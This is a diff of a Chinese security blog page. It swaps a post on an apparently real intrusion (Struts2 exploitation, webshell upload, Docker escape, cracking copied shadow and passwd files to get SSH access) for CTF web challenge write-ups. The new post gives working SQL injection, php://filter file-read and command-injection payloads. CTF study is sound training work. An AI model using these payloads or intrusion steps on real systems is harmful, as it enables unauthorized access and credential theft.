@@ -15,9 +15,9 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="">
-  <meta name="author" content="qt">
+  <meta name="author" content="RabbitQ">
   <meta name="keywords" content="">
-  <title>实战web打点到内网漫游 - qt安全博客</title>
+  <title>CTP笔记 - qt安全博客</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -174,9 +174,9 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="实战web打点到内网漫游">
+            <span class="h2" id="subtitle" title="CTP笔记">
               
-                实战web打点到内网漫游
+                CTP笔记
               
             </span>
 
@@ -186,8 +186,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-20 21:08" pubdate>
-        2021年3月20日 晚上
+      <time datetime="2021-05-05 16:01" pubdate>
+        2021年5月5日 下午
       </time>
     </span>
   
@@ -198,7 +198,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      247 字
+      730 字
     </span>
   
 
@@ -208,7 +208,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      10
        分钟
     </span>
   
@@ -238,19 +238,130 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">实战web打点到内网漫游</h1>
+            <h1 style="display: none">CTP笔记</h1>
             
             <div class="markdown-body">
-              <p>首先扫描主机：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/01.png" srcset="/img/loading.gif"></p>
-<p>开启的端口有2001和22，22先扔那，没有办法再日他，访问2001地址，是一个web：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/02.png" srcset="/img/loading.gif"></p>
-<p>发现.acition后缀，第一反应struct2，掏出我的小学生工具：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/03.png" srcset="/img/loading.gif"></p>
-<p>嗯。。。有洞，上传我的冰蝎马：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/04.png" srcset="/img/loading.gif"></p>
-<p>连接后发现根目录下的.dockerenv文件<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/05.png" srcset="/img/loading.gif"></p>
-<p>哎嘿，小老弟，在docker里面，常规的docker逃逸我就知道那几个，脏牛，cve-2019-5736，磁盘挂载，那个cve-2019-5736动静有点大而且要求比较多，还是掏出我得小学生工具cdk，尝试磁盘挂载，执行命令：./cdk run mount-disk，成功<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/06.png" srcset="/img/loading.gif"></p>
-<p>进入temp目录找到挂载的磁盘：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/07.png" srcset="/img/loading.gif"></p>
-<p>下载shadow以及passwd到本地，执行：unshadow  passwd shadow &gt;  test_passwd，合并为一个文件：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/08.png" srcset="/img/loading.gif"></p>
-<p>掏出我的小学生工具，john日他（不日我的新电脑岂不是白买了）<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/09.png" srcset="/img/loading.gif"></p>
-<p>日出来，用户名：ubuntu 密码：ubuntu，掏出我的putty连他<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/10.png" srcset="/img/loading.gif"><br>嗯。。。今天有点晚，就先搞到这吧，下一篇文章继续</p>
+              <ol>
+<li><p>EasySQL,第一反应就是sql注入，别问为啥，问就是因为我流批直接后面丢sql注释就完了</p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/01.png" srcset="/img/loading.gif">
+</li>
+<li><p>随便注，第一反应还是sql注入，直接丢个</p>
+<p><code>1;show databases</code></p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/02.png" srcset="/img/loading.gif">
+
+<p>emmm好使了，那就接着读表吧</p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/03.png" srcset="/img/loading.gif">
+
+<p>表出来就直接读字段就完了</p>
+<p><code>1-1&#39;;show columns from 1919810931114514#</code></p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/04.png" srcset="/img/loading.gif">
+
+<p>后台有正则验证，直接大小写加拼接绕过即可</p>
+<p><code> -1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</code></p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/05.png" srcset="/img/loading.gif">
+</li>
+<li><p>Havefun进来就看着个这玩意</p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/06.png" srcset="/img/loading.gif">
+
+<p>这时候必备的前端技能来了，直接右键检查，看到flag字段没</p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/07.png" srcset="/img/loading.gif">
+
+<p>直接构造payload：</p>
+<p><code> /?cat=dog</code></p>
+<p>flag就出来了，简简单单</p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/08.gif" srcset="/img/loading.gif">
+</li>
+<li><p>EasySQL不多墨迹，调整mysql 的sql_mode，payload：</p>
+<p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/09.png" srcset="/img/loading.gif">
+</li>
+<li><p>Include,直接点tips，看到url这不就是文件包含，flag.php，那就想办法把源码读出来就完了呗</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/10.png" srcset="/img/loading.gif">
+
+<p> payload:</p>
+<p> <code> ?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p> 读出来的东西直接base64解码就完了</p>
+</li>
+<li><p>Secret File,一进来，卧槽，这什么玩意？？？</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/11.png" srcset="/img/loading.gif">
+
+<p> 想了想，继续我的f12大法，嗯哼，发现了一个文件，小老弟，我可是做过前端开发的 </p>
+<p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/12.png" srcset="/img/loading.gif"> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/013.png" srcset="/img/loading.gif"> </p>
+<p> 点一下，一闪而过，嘿，你还没头了，burp直接抓包，一点不带惯着的</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/14.png" srcset="/img/loading.gif"> 
+
+<p> 又让我逮到了吧，访问他就完了呗，结果又给我整出来代码了，真想抽出我四十米的大砍刀，算了，出题的表哥我应该打不过</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/15.png" srcset="/img/loading.gif">
+
+<p> 直接访问flag.php</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/16.png" srcset="/img/loading.gif">
+
+<p> 。。。。。。。。。。。。。。。。。。。。。你到底要干啥</p>
+<p> 继续我的文件包含大业吧，构造payload：</p>
+<p> <code> ?file=php://filter/read=convert.base64-encode/resource=./flag.php</code></p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/17.png" srcset="/img/loading.gif">
+
+<p> 。。。。竟然还需要加解密，那就解他就完了呗，一看就是base64，解出来就是这样的：</p>
+<pre><code> &lt;html&gt;
+ &lt;head&gt;
+     &lt;meta charset=&quot;utf-8&quot;&gt;
+     &lt;title&gt;FLAG&lt;/title&gt;
+ &lt;/head&gt;
+ 
+ &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+     
+     &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+     
+     &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;
+         &lt;?php
+             echo &quot;我就在这里&quot;;
+             $flag = &#39;flag&#123;dfab7fd3-545b-4085-bf90-7ea08d2423e6&#125;&#39;;
+             $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;
+         ?&gt;
+     &lt;/p&gt;
+ &lt;/body&gt;
+</code></pre>
+ 
+
+<p> flag清清楚楚的就摆在那，搞定</p>
+</li>
+<li><p>一打开就是下面这个样子，这个我不是做过吗，这么简单</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/018.png" srcset="/img/loading.gif">
+
+<p> Login Success! ？？？？不是成功了嘛。。。。</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/019.png" srcset="/img/loading.gif">
+
+<p> 那就想办法爆库爆表爆字段吧：    </p>
+<pre><code> #查列数
+ admin&#39; order by 1#
+ 
+ #查回显位
+ -1&#39; union select 1,2,3#
+ 
+ #查库
+ -1&#39; union select 1,2,database()#
+ 
+ #查表
+ -1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#39;geek&#39;#
+ 
+ #查字段
+ -1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;l0ve1ysq1&#39;#
+ 
+ #查flag
+ -1&#39; union select 1,2,group_concat(password) from  l0ve1ysq1#
+</code></pre>
+</li>
+<li><p>EXEC,明显的命令执行，带个ls试试：</p>
+ <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/20.png" srcset="/img/loading.gif">
+
+<p> 接下来就翻就完了</p>
+<p> <code> 127.0.0.1;cat ../../../flag</code></p>
+</li>
+<li></li>
+<li></li>
+<li></li>
+<li></li>
+</ol>
 
             </div>
             <hr>
@@ -260,7 +371,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E4%B8%BB%E6%9C%BA/">主机</a>
+                      <a class="hover-with-bg" href="/categories/web/">web</a>
                     
                   </div>
                 
@@ -272,18 +383,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CTP笔记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/">
-                        <span class="hidden-mobile">HTB Passage教程</span>
+                      <a href="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/">
+                        <span class="hidden-mobile">实战web打点到内网漫游</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
